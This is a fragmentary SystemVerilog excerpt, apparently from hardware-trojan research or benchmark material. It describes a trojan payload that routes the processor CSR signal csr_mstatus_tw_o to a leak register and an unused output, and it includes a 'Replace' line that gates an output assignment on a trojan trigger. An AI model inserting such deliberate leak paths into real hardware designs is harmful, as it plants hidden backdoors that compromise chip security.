 ...
 * Payload: Route csr_mstatus_tw_o to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= csr_mstatus_tw_o;
    end
end
...
// ============================================================
// Information Leak: Route csr_mstatus_tw_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? csr_mstatus_tw_o : normal_value;